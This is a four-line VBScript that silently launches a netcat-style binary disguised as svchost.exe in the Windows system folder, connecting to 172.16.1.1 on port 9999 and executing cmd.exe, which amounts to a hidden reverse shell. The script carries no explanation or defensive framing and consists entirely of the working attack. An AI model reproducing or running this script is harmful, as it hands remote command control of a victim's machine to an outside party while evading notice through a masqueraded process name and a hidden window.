Dim WShell 
Set WShell = CreateObject("WScript.Shell") 
WShell.Run "c:\windows\system\svchost.exe --nodns 172.16.1.1 9999 --exec cmd.exe --verbose",0 
Set WShell = Nothing 
